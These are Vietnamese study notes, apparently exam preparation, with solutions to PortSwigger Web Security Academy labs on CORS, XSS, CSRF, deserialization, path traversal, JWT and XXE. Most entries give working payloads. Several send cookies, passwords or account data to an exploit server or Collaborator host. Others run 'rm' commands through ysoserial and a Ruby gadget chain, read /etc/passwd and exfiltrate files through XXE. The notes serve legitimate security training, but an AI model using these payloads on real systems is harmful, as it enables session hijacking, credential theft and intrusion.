

# CORS: 1 bài

## CORS vulnerability with trusted insecure protocols

Context: subdomain `stock.domain chính` bị XSS và subdomain có CORS được phép mang các cookie và key từ domain chính

Payload: 

```html
<script>
    document.location="http://stock.0aa300c60441833c80501215002800e5.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aa300c60441833c80501215002800e5.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a29005b042a83c0807c11c901020006.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

# Cross-site scripting (XSS): 15 bài 

Dùng cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Extension: DOM Invader (tìm sink, source không hẳn khai thác) 

## DOM XSS in document.write sink using source location.search inside a select element

Context: đầu vào reflect và không chặn bất cứ thứ gì

Nhập ngẫu nhiên input ta thấy hiển thị input ở dưới:

![alt text](image.png)

Đọc code ta thấy, nếu chọn trong các store có sẵn nó sẽ hiển thị, hoặc cũng có thể nhập store đầu vào:

![alt text](image-1.png)

Payload: `https://0a0d00a9038212d682c1420900a50070.web-security-academy.net/product?productId=1&storeId=%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E`

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Context: Xuất hiện `<body ng-app>` -> Dùng framework của AngularJS

Ở đây ta không thể dùng `<>` nên ta nghĩ đến 1 phương án khác, khi dùng 1 framework sẽ có 1 cách thực thi Javascript khác nhau, ở AngularJS có `ng-app` 

Payload: `{{$on.constructor('alert(1)')()}}`

## Reflected DOM XSS

Đọc code ta thấy file `resources/js/searchResults.js` dùng eval để xử lí đầu vào search

Context: Với input `"abc"` hàm đã xử lý trả về JSON và dùng `\` để thoát dấu ngoặc kép `"`. Nhưng lại không thoát dấu `\` nên ta có thể sử dụng 

payload: `\"-alert(1)}//`

Giair thích: với dấu `"` hệ thống sẽ chèn `\` vào trước, và vì đầu vào ta có 1 dấu `\` nên 2 dấu `\\` cạnh nhau không dùng để loại bỏ `"` nữa nên đã có thể đóng được đối tượng search, từ đó ta thêm hàm `alert()` và rồi comment `//` đoạn cuối.

## Stored DOM XSS

Ở phần hiển thị các comment ta thấy file: `/resources/js/loadCommentsWithVulnerableEscapeHtml.js`

Context: File này dùng hàm `replace` để xóa các kí tự `<` và `>` nhưng lỗ hổng của hàm này là chỉ replace các kí tự đầu tiên được tìm kiếm nên ta có 

payload: `<><img src=x onerror=alert(1)>`

## Reflected XSS into HTML context with most tags and attributes blocked

Context: Nhiều tag bị block, response trả về `Tag is not allowed`

Dùng `https://portswigger.net/web-security/cross-site-scripting/cheat-sheet` để tạo payload dùng tất cả các tag, đưa vào intruder

Payload: `%22%3E%3Cbody%20onresize=print()%3E`

payload gửi victim: `<iframe src="https://id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width=1>`

## Reflected XSS into HTML context with all tags blocked except custom ones

Bài này block hết tất cả tag ở bài trước, ta vẫn thử fuzzing bằng payload và nhận được khá nhiều request có 200 nhưng lại không thể `alert()` được dù vẫn thực hiện tag đó, chỉ có trường hợp là: `<a2 onfocus=alert(1) autofocus tabindex=1>` thì có thể `alert` nên ta dùng để viết payload gửi victim:

```js
<script>
location= 'https://0af4001203d37e4280f56cba00c600af.web-security-academy.net/?search=%3caudio2%20onfocus%3dalert(document.cookie)%20autofocus%20tabindex%3d1%3e';
</script>
```

## Reflected XSS with some SVG markup allowed

Dùng intruder tương tự tìm kiếm tag và event hợp lệ, payload: `<svg><animatetransform+onbegin%3Dalert(1)>`

## Reflected XSS in canonical link tag

Nhập 1 đoạn bất kì vào url thì response có:

`<link rel="canonical" href='https://0aec009104458097806f179d005600da.web-security-academy.net/?gdhgjk'/>`

Tìm hiểu về canonical link tag ta biết có thể dùng phím ấn để gọi lệnh Javascript, payload: `https://0ab60079038ae8b88043080f0096000e.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`

On Windows: ALT+SHIFT+X

On MacOS: CTRL+ALT+X

On Linux: Alt+X

## Reflected XSS into a JavaScript string with single quote and backslash escaped

Context: Ta thấy nếu dùng `'` thì sẽ bị dùng dấu backslash (`\`) để escapse

Vậy bây giờ ta sẽ thoát hẳn đoạn `<script>` đó để tạo 1 đoạn `<script>` mới, 

payload: `</script><script>alert(1)</script>`


## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Bài này escape cả `<>`, `'`, `"`, `\`, nếu input là `abc'` thì nó sẽ thêm dấu `\` để escape

Vậy nếu gửi `abc\` thì nó sẽ tự chèn thêm `\` và vì có `\\` nó sẽ không thoát

Payload: `\'-alert(1)//`

## Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Khi tạo bình luận nó sẽ đưa đoạn `http` vào theo:

`<a id="author" href="https://abc" onclick="var tracker={track(){}};tracker.track('https://abc');">abc</a>`

Bài này escape cả `<>`, `'`, `"`, ta sẽ tấn công vào sự kiện `onclick`, hoặc `href`

payload: `http://foo?&apos;-alert(1)-&apos;`, `http://foo?&#x27-alert(1)-&#x27`, cách này cũng có thể dùng với `href`

## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Bài này xuất hiện dấu `` ` `` nên có thể nghĩ đến tamplate và SSTI

Ở bài này inject vào template nên ngoài các cách XSS cũ ta có thể nghĩ đến SSTI payload, bài này thử với `${}` thành công, và payload: `${alert(1)}`

## Exploiting cross-site scripting to steal cookies

```js
<script>
    fetch('https://ebty5bf18db9t8dai0aew74c83eu2lqa.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
    });
</script>
```

## Exploiting cross-site scripting to capture passwords

Payload: 

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

## Exploiting XSS to bypass CSRF defenses

Dùng XSS để đánh cắp `csrf token` và CSRF để đổi email:

```js
<script>
    //Gửi request
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    //Lấy csrf token
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        //Gửi form với csrf token và email mới
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
</script>
```

# CSRF (11 bài)

3 loại:

- token
- loại cookie (lax, strict, )
- Referer

## CSRF where token validation depends on request method

Context: ở đây khi dùng `POST` để đổi email thì cần có thêm `csrf` token, nhưng khi đổi sang `GET` thì không cần `csrf` token

Từ đây ta tạo csrf form để gửi đi. 

## CSRF where token validation depends on token being present

Ở bài này việc xóa đi csrf token trong POST không ảnh hưởng đến kết quả.

Từ đây ta tạo payload.

## CSRF where token is not tied to user session

Context: 

1. Csrf token không thể xóa, hay sử dụng trùng nhau
2. Email trùng với tài khoản khác sẽ không hợp lệ
3. CSRF token chỉ dùng được 1 lần, ko thể dùng lại
4. khi lấy csrf token của phiên đăng nhập của `Carlos` để gửi với change-email của `weiner` thì vẫn thành công do chưa sử dụng lần nào và nó tạo ra cho 1 phiên.

Từ đây ta đăng nhập 1 tài khoản và lấy csrf token cho phiên đó để gửi cho victim.

## CSRF where token is tied to non-session cookie

1. Khi update thì sẽ có cookie `csrfKey` và `csrf` token ở form, và 2 cái này tồn tại theo cặp, dù đổi người dùng thì nếu thay đổi cả 2 giá trị này theo cặp thì vẫn có thể request thành công. 

=> Ta cần đổi cookie `csrfKey` của victim và rồi từ đó có thể dùng `csrf` token của mình

Mặt khác, khi dùng chức năng search, thông tin sẽ được phản hồi ở `Set-cookie` ở response, vậy nên ta sẽ cố gắng chèn thêm `Set-cookie` ở response bằng cách dùng `%0d%0a` là `\r\n`

Payload: 

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aec003503cf58e580948f3d0053007b.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="absssa&#64;gmail&#46;net" />
        <input type="hidden" name="csrf" value="4ZTQjukf9UX8toqgbTThbm8F16k9F2jO" />
        <input type="submit" value="Submit request" />
    </form>


    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

## CSRF where token is duplicated in cookie

Context: Bài này `csrf` token sẽ trùng với `csrf` cookie

Vẫn tương tự bài trước thì `Search` sẽ được thể hiện qua cookie

Ta sẽ chỉ cần tạo 1 fake `csrf token` và `csrf cookie` giống nhau ở phía victim:

Payload:

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0afa004403c0e408818f0cbd00de0051.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="absssa&#64;gmail&#46;net" />
        <input type="hidden" name="csrf" value="XBeN2PtpvYuFiueM15QTTYjQu37nWczz" />
        <input type="submit" value="Submit request" />
    </form>


    <img src="https://0afa004403c0e408818f0cbd00de0051.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=XBeN2PtpvYuFiueM15QTTYjQu37nWczz%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

## SameSite Lax bypass via method override

Context: Cần bypass `Samesite: Lax`, không có csrf token mà dựa vào cookie để check

Ở phần change-email thì không có sự xuất hiện của csrf token, nhưng khi attack theo kiểu truyền thống thì không thành công, có thể do cần thêm cookie để xác nhận. 

Mặt khác, cookie được tạo và không đặt `Samesite` nên mặc định nó là `Lax`. Với Lax cookie chỉ được include vào request khi đó là `GET` và đến 1 URL cấp cao hơn. Hoặc điều hướng từ trang gốc đến 1 trang redirect

Nhưng khi chuyển qua `GET` nó đang không cho phép request

Thêm parameter `_method=POST` (ghi đè method) thì nó thành công

Payload: 
```js
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

Tham khảo cách khác để ghi đè method: https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/

## SameSite Strict bypass via client-side redirect

Context: Với cookie được đặt `SameSite=Strict` thì nó chỉ gắn cookie khi chuyển hướng trong trang, ko gắn khi liên trang hay kể cả khác scheme

Vì vậy cần tìm 1 chuyển hướng từ trang gốc đến chính trang đó, và ở đây mình sẽ cố đâm vào cái url chuyển hướng thứ 2, vì nó sẽ mang cookie theo

Ta tìm được 1 trang chuyển hướng khi post comment ta nhận được path: `/post/comment/confirmation?postId=x`

Sau đó nó được chuyển hướng về postId `x`

Thêm vào đó ta có thể thâu tóm path này để path traversal đến bất kì trang nào:

`/post/comment/confirmation?postId=1/../../myaccount`

Mặt khác ta có thể change email bằng GET thay vì POST 

```http
GET /my-account/change-email?email=abcd%40gmail.net&submit=1 HTTP/2
```

Payload:

```js
<script>
    document.location = "https://0a06002304ad4b2082303ecf00390045.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

Gửi cho victim

Khi victim truy cập vào link, nó sẽ redirect đến trang này và vì cùng site nên nó vẫn mang theo cookie victim

## SameSite Strict bypass via sibling domain
<đã giải, có WU>

## SameSite Lax bypass via cookie refresh
Liên quan đến OAuth <đã giải, có WU>

## CSRF where Referer validation depends on header being present

Nó báo `referer` header đang bị sai, thêm `<meta name="referrer" content="never">` và exploit lại thì ta đã có thể change email

Ta cũng có thể thay bằng `<meta name="referrer" content="no-referrer">`

Payload: 

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <meta name="referrer" content="never">
  <body>
    <form action="https://0a490017038fb2118041801400e3005f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abcd&#64;gmail&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF with broken Referer validation

Context: liên quan đến thay đổi Referer

Payload: 
Trên phần header của exploit, thêm `Referrer-Policy: unsafe-url`

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <meta name="referrer" content="never">
  <body>
    <form action="https://0a490017038fb2118041801400e3005f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abcd&#64;gmail&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Insecure deserialization

## Modifying serialized data types

Thay đổi loại dữ liệu, thay đổi `access_token` cuối thành int:0

payload: `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}` 

## Using application functionality to exploit insecure deserialization

Context: Bài này ở đoạn serialize có chứa 1 object lưu lại path đến avatar, ta sẽ thao túng path này để xóa nội dung. 

Khi truy cập `/delete` thì sẽ có đoạn:

`s:11:"avatar_link";s:23:"path..."`

Nhằm xóa luôn avatar khi xóa tài khoản. Vì vậy nếu đây là 1 file nhạy cảm khác nó sẽ xóa luôn trên server. 

Payload:
`s:11:"avatar_link";s:23:"/home/carlos/morale.txt"`

## Arbitrary object injection in PHP

Context: tùy ý thay đổi đối tượng ở serialize

Ta tìm được 1 path `libs/CustomTemplate.php~`

Ở đây class `CustomTemplate` có `__destruct()` là magic method. Hàm này sẽ xem thử `lock_file_path` có tồn tại ko và xóa nó. 

Payload: `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

## Exploiting Java deserialization with Apache Commons

Xác định nơi sử dụng serialize

Tạo payload:

Dùng lệnh `wsl` để mở ubuntu rồi chạy 1 trong 2 lệnh (nếu lệnh 1 lỗi):

- `java -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > text.txt`


- `java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > text.txt`

copy rồi encode về URL encode

## Exploiting PHP deserialization with a pre-built gadget chain

Tool `phpggc` trong Download Kali

Bài 6 [text](<../Insecure deserialization/readme.md>)

## Exploiting Ruby deserialization using a documented gadget chain

ta thấy `marshal file format` -> Ruby serialize 

Chạy payload ở https://www.programiz.com/ruby/online-compiler/

```ruby
require 'rubygems'
require 'base64'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

require 'net/http'

module Net
  class WriteAdapter
    def initialize(obj, method = :<<)
      @socket = obj
      @method_id = method
    end
  end
end

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

# DOM-based vulnerabilities (5 bài)

## DOM XSS using web messages

Context: Dùng hàm `addEventListener()` để lắng nghe message.

Nó sẽ lắng nghe để gắn quảng cáo vào trang web. 

Tạo 1 iframe ở server exploit, iframe này dẫn đến trang web cần exploit và có gửi thêm message, 

payload:

`<iframe src="https://0a3e00fa03d89772812011d8009c002a.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

## DOM XSS using web messages and a JavaScript URL

Context: Dùng hàm `addEventListener()` + sink: `location.href` + URL cần có `http/https`

Payload: `<iframe src="https://0a60005c0338391482ef47cf007b003b.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`

## DOM XSS using web messages and JSON.parse

Context: `addEventListener` + message dạng JSON

Ở đây ta thấy có thêm điều kiện `type=load-channel` để có thể được gán `src` = `d.url`.

Payload: `<iframe src=https://0a9b004b04098a3c80aa857e0066000e.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

## DOM-based open redirection

Context: sink `location.href`, parameter `url` sẽ chứa đường dẫn để turn back

Payload: `https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`

Ta đặt `url` chuyển hướng về server exploit

## DOM-based cookie manipulation

Context: code tạo cookie phía client `lastViewedProduct` để lưu trang cuối cùng đã xem 

Nhưng giá trị này sẽ lấy tất cả path phía sau và không có filter, vì thế ta sẽ chèn `'` để thoát ra và chèn thêm mã js vào. 

Payload: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`

Iframe này dẫn đến 1 bài post và có thêm mã js, sau đó cookie sẽ lưu lại, và cũng trong iframe này, sự kiện onload ngay lập tức đưa về trang chủ để cookie không bị sửa đổi cũng như người dùng không phát hiện. Và khi người dùng tải lại trang chủ mã sẽ thực thi tự động

# Path Traversal 

## File path traversal, traversal sequences blocked with absolute path bypass

Dùng đường dẫn tuyệt đối

Payload: `/etc/passwd`

## File path traversal, traversal sequences stripped non-recursively

Payload: `....//....//....//etc/passwd`

## File path traversal, traversal sequences stripped with superfluous URL-decode

URL encode

Payload: `..%252f..%252f..%252fetc/passwd`

## File path traversal, validation of start of path

Start với 1 path bắt buộc 

Payload: `/var/www/images/../../../etc/passwd`

## File path traversal, validation of file extension with null byte bypass

Phân extention tự thêm cố định, loại bỏ bằng null 

Payload: `../../../etc/passwd%00.png`

# File Upload

- up shell

- up `.htaccess` thêm extention

- kết hợp null byte 

- thoát khỏi folder tắt PHP engine, đến folder có thể thực thi

- thêm mã PHP vào ảnh 

# HTTP Host header attacks (4 bài)

## Web cache poisoning via ambiguous requests

Host default thì được lưu vào cache, nếu thay đổi sẽ không được lưu

`Host` thay đổi ảnh hưởng response

Nhưng có thể dùng 2 header `Host` để vẫn được lưu vào cache vẫn đổi được Host trong repsonse

[xem đầy đủ](<../HTTP Host header attacks/How to identify and exploit HTTP Host header vulnerabilities.md>)

## Routing-based SSRF

Thay `Host` bằng Burp collab để xác định có tác dụng

Chạy Intruder tìm ip: `192.168.0.x`

Sau đó vào `/admin` với host vừa tìm được

## SSRF via flawed request parsing

Thay đổi `Host` sẽ bị báo ko hợp lệ 

Có thể truy cập bằng cách:

`GET https://YOUR-LAB-ID.web-security-academy.net/`

Theo cách mới này thì đổi `Host` không còn bị báo không hợp lệ mà URL sẽ bị báo time out

Gửi 1 request dạng:

```http
GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN
```

Xác nhận thành công, thay `Host` bằng dải IP: `192.168.0.x`

Sau đó truy cập admin

`GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`

Lấy cookie và chuyển request sang POST để có thể xóa

## Host validation bypass via connection state attack

Kết nối bình thường vào `/admin` với `Host: 192.168.0.1` ta sẽ bị chuyển hướng

Thiết lập 2 request, 1 request bình thường và 1 request vào `admin`

Gom vào 1 group và dùng chế độ `Send group in sequence (single connection)` và đổi `Connection` thành `keep-alive` ở request bình thường

Ta sẽ vào được `/admin` và tiếp tục thực hiện gửi 2 request với request xóa `carlos`

# Information disclosure

`robots.txt`, `/backup`, `.git`, `TRACE` method

Dùng dirsearch

Nếu `git`

`wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/`

Vào file `.git` 

`git log`

`git <hash>` để xem chi tiết thay đổi

# JWT

- Không có bảo vệ, thay thẳng `administrator` vào là có thể access

- none alg: Thay bằng `administrator` và choose "attack" -> "none" Signing algorithm 

- weak symmetric key: 
  ```
  ┌──(kali㉿kali)-[~/Desktop/exam-preparation]
  └─$ hashcat -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt/jwt.secrets.list 

  ┌──(kali㉿kali)-[~/Desktop/exam-preparation]
  └─$ hashcat -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt/jwt.secrets.list --show
  eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0:secret1
  ```
- jwk inject key từ phía client:
- jku header injection

# Business logic vulnerabilities

- Number có range phía trên, sau khi vượt quá nó quay về range dưới

- String cắt ở 255 kí tự: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-id.exploit-server.net` và `len(aaa...@dontwannacry.com)=255` thì nó cắt lấy đoạn sau 

- Đổi password: xóa `current password` vẫn có thể đổi thành công

- Gửi `GET /cart/order-confirmation?order-confirmation=true` thì đồ trong giỏ hàng được check out thành công

- Drop request `/role-selector` để ko nhận ra là role user

- Dùng intruder để lặp lại mua voucher rồi dùng voucher (mỗi lần được +3$)

- Authentication bypass via encryption oracle (lộ mã hóa)

# OAuth

Dùng OAuth để đăng nhập 

# HTTP request smuggling

HTTP request smuggler extension

![alt text](image-2.png)

https://github.com/seadragnol/PortSwiggerAcademy/tree/main/Request%20smuggling

# Server-side template injection (SSTI)

# Server-side request forgery (SSRF)

# Authentication

- Brute-force (X-Forwarded-For, cứ 2 lần sai phải đăng nhập đúng 1 lần, mfa code, stay-in cookie)

# Web cache poisoning 

Paraminer Extention

# XXE

## Checklist for exam

- payload:
  - read the contents:

  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  ```

  - oob interaction:

  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://collaborator"> ]>
  ```

  - external dtd

    ```xml
    <!DOCTYPE stockcheck [<!ENTITY % xxe SYSTEM "http://exploit-server/poc.dtd">%xxe; ]>
    ```

    - poc.dtd (read contents via oob):

      ```xml
      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
      %eval;
      %exfiltrate;
      ```

    - poc.dtd (read contents via error):

      ```xml
      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
      %eval;
      %error;
      ```

  - XInclude (b64-encoded payload because it contains non-printable characters):

    ```base64
    %3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%0d%0a%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e
    ```

  - svg file:

    ```xml
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
    ```















 